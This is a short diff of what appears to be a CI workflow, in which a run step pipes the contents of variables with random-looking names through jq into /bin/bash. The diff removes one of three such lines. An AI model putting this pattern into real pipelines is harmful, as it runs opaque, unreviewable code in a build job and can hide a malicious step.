@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$krez7755" | jq -r .uppfg8 | /bin/bash
           echo $jmuqq5 | jq -r .g64 | /bin/bash
-          echo $me6904 | jq -r .brks89 | /bin/bash
 
       - name: Archive output
         if: always()
